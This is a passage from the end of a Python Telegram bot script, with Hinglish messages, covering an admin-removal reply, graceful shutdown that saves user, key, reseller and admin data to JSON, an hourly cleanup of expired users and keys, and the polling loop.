        f"🌌 *Status*: Ab Cosmic Admin nahi! Chal, agla kaam bol! 😎"
    ), parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Admin {target_admin_id} removed by {user_id}")

# Signal handler for graceful shutdown
def signal_handler(sig, frame):
    logging.info("Shutting down bot gracefully...")
    save_json(USER_FILE, users)
    save_json(KEY_FILE, keys)
    save_json(RESELLERS_FILE, resellers)
    save_json(ADMINS_FILE, dynamic_admins)
    bot.stop_polling()
    exit(0)

# Register signal handlers for nohup
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# Periodic cleanup of expired users and keys
def cleanup_expired():
    while True:
        current_time = datetime.datetime.now()
        users_to_remove = []
        for user_id, expiration in users.items():
            try:
                expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
                if current_time > expiration_date:
                    users_to_remove.append(user_id)
            except ValueError:
                logging.error(f"Invalid expiration format for user {user_id}")
        for user_id in users_to_remove:
            del users[user_id]
            logging.info(f"Removed expired user {user_id}")
        save_json(USER_FILE, users)

        keys_to_update = []
        for key, details in keys.items():
            if details.get("expiration_time"):
                try:
                    expiration = datetime.datetime.strptime(details["expiration_time"], '%Y-%m-%d %H:%M:%S')
                    if current_time > expiration:
                        keys_to_update.append(key)
                except ValueError:
                    logging.error(f"Invalid expiration format for key {key}")
        for key in keys_to_update:
            keys[key]["expiration_time"] = None
            logging.info(f"Cleared expiration for key {key}")
        save_json(KEY_FILE, keys)
        time.sleep(3600)  # Run every hour

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_expired, daemon=True)
cleanup_thread.start()

# Load initial data
load_data()

# Start polling
if __name__ == "__main__":
    try:
        logging.info("Starting bot polling...")
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception as e:
        logging.error(f"Polling error: {e}")
        time.sleep(5)  # Retry after 5 seconds